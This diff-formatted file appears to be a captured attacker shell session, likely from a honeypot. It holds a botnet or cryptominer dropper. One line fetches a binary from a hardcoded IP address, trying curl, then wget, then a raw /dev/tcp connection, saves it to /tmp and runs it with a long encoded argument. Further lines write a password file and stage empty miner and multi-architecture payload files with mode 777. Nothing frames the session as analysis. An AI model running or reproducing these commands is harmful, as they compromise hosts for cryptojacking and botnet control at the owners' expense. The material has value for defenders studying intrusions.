@@ -1,0 +1,21 @@
+echo 1 && cat /bin/echo
+nohup $SHELL -c "curl http://129.144.180.26:60107/linux -o /tmp/ZDyG4Ysurf; if [ ! -f /tmp/ZDyG4Ysurf ]; then wget http://129.144.180.26:60107/linux -O /tmp/ZDyG4Ysurf; fi; if [ ! -f /tmp/ZDyG4Ysurf ]; then exec 6<>/dev/tcp/129.144.180.26/60107 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/ZDyG4Ysurf && chmod +x /tmp/ZDyG4Ysurf && /tmp/ZDyG4Ysurf sdPANizDzu2A28SM6dHfIz7Hw8HAxNE1I9XR6IXM24XuzMMhPMvFwMHHwyQtw83og9vHgenR1Sc+x8PBxMvRNSTZ0e+D28SE69HcJDXLxcDBx8kkIdrR64fN24bqy8MkMsnJxsDCwzQ11dHoh8Lbg+/R3CUzy8XAwcPJJCba0euEwduF6sjDJzHDycbAwsUzNdzP6JrNzJruycMnNsvFwMHBwCQtw83og9vHhunR3Cwzy8XAwcfFJCHa0eiFxNuF68rDIDbLxcDBwcUkLcPN6ITbxIfo0d8hPcvFwMHDwyQk2s73hsTBmurR3CUwy8XAwcfJJCffzveGx8ya6M/eOzXIy8rGw8A0JM3J7ZrHx4P3zd87M8TJxsDCwzc13sb3hcPAmujL2js9ycnGwMLDMTXV0euFzduH69HfJzLLxcDBwMQkIdrR64DG24XryMMiMMvFwMHBxCQk2M/3hsfGmu/NwyQzyMnGwMLFPDXczemawMaa683fOz3DycbAwsM1NdzH65rEwIX3y9k7NsTGysbDwDAlzcvumsLDmu7NwyQzx8nGwMLCMjXZyPeGxs2a68zaOzbBy8rGw8A2Lc3L7prHwYf3zds7NcLCysbDwDAnzc7pgtvAh/fN3SIqxsnGwMLDNDXZyPeGxsOa6M/UOzXHwcrGw8A1I83L7prHxoL3ztshKsDAw8rFwTUn39/ohszbhe3LwyQ8wd3CxsnHNCTdyPmAwtuD79HZIyrAxcHKxcE1Idvf7YPbwoL3ztklKsbBysbDwDQszc7rhNvHgvfO3ycqxMvKxsPANScWmuDD5PLENTIJ/IbsOx/xxxFp5gIW; fi; echo 12345678 > /tmp/.opass; chmod +x /tmp/ZDyG4Ysurf && /tmp/ZDyG4Ysurf sdPANizDzu2A28SM6dHfIz7Hw8HAxNE1I9XR6IXM24XuzMMhPMvFwMHHwyQtw83og9vHgenR1Sc+x8PBxMvRNSTZ0e+D28SE69HcJDXLxcDBx8kkIdrR64fN24bqy8MkMsnJxsDCwzQ11dHoh8Lbg+/R3CUzy8XAwcPJJCba0euEwduF6sjDJzHDycbAwsUzNdzP6JrNzJruycMnNsvFwMHBwCQtw83og9vHhunR3Cwzy8XAwcfFJCHa0eiFxNuF68rDIDbLxcDBwcUkLcPN6ITbxIfo0d8hPcvFwMHDwyQk2s73hsTBmurR3CUwy8XAwcfJJCffzveGx8ya6M/eOzXIy8rGw8A0JM3J7ZrHx4P3zd87M8TJxsDCwzc13sb3hcPAmujL2js9ycnGwMLDMTXV0euFzduH69HfJzLLxcDBwMQkIdrR64DG24XryMMiMMvFwMHBxCQk2M/3hsfGmu/NwyQzyMnGwMLFPDXczemawMaa683fOz3DycbAwsM1NdzH65rEwIX3y9k7NsTGysbDwDAlzcvumsLDmu7NwyQzx8nGwMLCMjXZyPeGxs2a68zaOzbBy8rGw8A2Lc3L7prHwYf3zds7NcLCysbDwDAnzc7pgtvAh/fN3SIqxsnGwMLDNDXZyPeGxsOa6M/UOzXHwcrGw8A1I83L7prHxoL3ztshKsDAw8rFwTUn39/ohszbhe3LwyQ8wd3CxsnHNCTdyPmAwtuD79HZIyrAxcHKxcE1Idvf7YPbwoL3ztklKsbBysbDwDQszc7rhNvHgvfO3ycqxMvKxsPANScWmuDD5PLENTIJ/IbsOx/xxxFp5gIW" &
+head -c 0 > /tmp/BVleSa6vA3
+chmod 777 /tmp/BVleSa6vA3
+/tmp/BVleSa6vA3 sdPANizDzu2A28SM6dHfIz7Hw8HAxNE1I9XR6IXM24XuzMMhPMvFwMHHwyQtw83og9vHgenR1Sc+x8PBxMvRNSTZ0e+D28SE69HcJDXLxcDBx8kkIdrR64fN24bqy8MkMsnJxsDCwzQ11dHoh8Lbg+/R3CUzy8XAwcPJJCba0euEwduF6sjDJzHDycbAwsUzNdzP6JrNzJruycMnNsvFwMHBwCQtw83og9vHhunR3Cwzy8XAwcfFJCHa0eiFxNuF68rDIDbLxcDBwcUkLcPN6ITbxIfo0d8hPcvFwMHDwyQk2s73hsTBmurR3CUwy8XAwcfJJCffzveGx8ya6M/eOzXIy8rGw8A0JM3J7ZrHx4P3zd87M8TJxsDCwzc13sb3hcPAmujL2js9ycnGwMLDMTXV0euFzduH69HfJzLLxcDBwMQkIdrR64DG24XryMMiMMvFwMHBxCQk2M/3hsfGmu/NwyQzyMnGwMLFPDXczemawMaa683fOz3DycbAwsM1NdzH65rEwIX3y9k7NsTGysbDwDAlzcvumsLDmu7NwyQzx8nGwMLCMjXZyPeGxs2a68zaOzbBy8rGw8A2Lc3L7prHwYf3zds7NcLCysbDwDAnzc7pgtvAh/fN3SIqxsnGwMLDNDXZyPeGxsOa6M/UOzXHwcrGw8A1I83L7prHxoL3ztshKsDAw8rFwTUn39/ohszbhe3LwyQ8wd3CxsnHNCTdyPmAwtuD79HZIyrAxcHKxcE1Idvf7YPbwoL3ztklKsbBysbDwDQszc7rhNvHgvfO3ycqxMvKxsPANScWmuDD5PLENTIJ/IbsOx/xxxFp5gIW
+cp /tmp/BVleSa6vA3 /tmp/linux
+head -c 0 > /tmp/winminer_sign
+head -c 0 > /tmp/mips_linux_sign
+head -c 0 > /tmp/windows
+head -c 0 > /tmp/winminer
+head -c 0 > /tmp/linux_sign
+head -c 0 > /tmp/mipsel_linux
+head -c 0 > /tmp/miner
+head -c 0 > /tmp/miner_sign
+head -c 0 > /tmp/arm_linux_sign
+head -c 0 > /tmp/mips_linux
+head -c 0 > /tmp/mipsel_linux_sign
+head -c 0 > /tmp/windows_sign
+head -c 0 > /tmp/arm_linux
+
+exit
